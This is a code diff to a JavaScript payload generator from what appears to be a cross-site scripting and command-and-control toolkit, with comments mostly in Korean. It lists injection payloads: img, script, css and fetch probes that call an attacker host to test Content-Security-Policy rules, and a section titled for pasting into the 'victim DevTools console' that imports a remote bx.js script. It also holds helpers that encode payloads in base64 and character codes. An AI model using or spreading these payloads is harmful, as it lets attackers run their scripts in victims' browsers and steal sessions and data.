@@ -1440,17 +1440,17 @@ function plParts(){
   var imp = "import('" + U + "')";
   var fcc = [];
   for (var i=0;i<imp.length;i++) fcc.push(imp.charCodeAt(i));
-  return { U:U, HP:HP,
+  return { U:U, BASE:plC2Base(), HP:HP,
            B64:btoa(imp), FCC:fcc.join(","), UENC:encodeURIComponent(U) };
 }
 var PAYLOADS = [
   {sec:"Probe · one-shot — 연결 확인 + 트리거를 한 번에", items:[
-    {n:"one-shot (img + script)", d:"probe hit(연결 확인) 후 곧바로 bx.js 로드", c:'<img src="{C2}/probe?tag=hit"><script src="{C2}"><\/script>'},
+    {n:"one-shot (img + script)", d:"probe hit(연결 확인) 후 곧바로 bx.js 로드", c:'<img src="{BASE}/probe?tag=hit"><script src="{C2}"><\/script>'},
     {n:"one-shot (단일 태그)", d:"bx.js 요청 자체가 Probe 탭에 기록됨 (Referer=발생 페이지)", c:'<script src="{C2}?tag=hit"><\/script>'},
-    {n:"img probe", d:"JS 불필요 — img-src 허용 여부만 확인 (1x1 GIF 응답)", c:'<img src="{C2}/probe?tag=img">'},
-    {n:"script probe", d:"script-src 허용 여부 확인 (세션 생성 없음)", c:'<script src="{C2}/probe.js?tag=script"><\/script>'},
-    {n:"css probe", d:"style-src 허용 여부 확인", c:'<link rel="stylesheet" href="{C2}/probe.css?tag=css">'},
-    {n:"fetch probe", d:"connect-src 확인 (콘솔 붙여넣기용, no-cors)", c:"fetch('{C2}/probe?tag=fetch',{mode:'no-cors'})"},
+    {n:"img probe", d:"JS 불필요 — img-src 허용 여부만 확인 (1x1 GIF 응답)", c:'<img src="{BASE}/probe?tag=img">'},
+    {n:"script probe", d:"script-src 허용 여부 확인 (세션 생성 없음)", c:'<script src="{BASE}/probe.js?tag=script"><\/script>'},
+    {n:"css probe", d:"style-src 허용 여부 확인", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=css">'},
+    {n:"fetch probe", d:"connect-src 확인 (콘솔 붙여넣기용, no-cors)", c:"fetch('{BASE}/probe?tag=fetch',{mode:'no-cors'})"},
   ]},
   {sec:"Console trigger — paste into the victim DevTools console", items:[
     {n:"import (shortest)", d:"module import — bx.js is served with CORS *", c:"import('{C2}')"},
@@ -1488,7 +1488,7 @@ var PAYLOADS = [
 ];
 function plCode(si, ii){
   var P=plParts(), t=PAYLOADS[si].items[ii].c;
-  return t.replace(/\{C2\}/g,P.U).replace(/\{HP\}/g,P.HP)
+  return t.replace(/\{C2\}/g,P.U).replace(/\{BASE\}/g,P.BASE).replace(/\{HP\}/g,P.HP)
           .replace(/\{B64\}/g,P.B64).replace(/\{FCC\}/g,P.FCC)
           .replace(/\{UENC\}/g,P.UENC);
 }
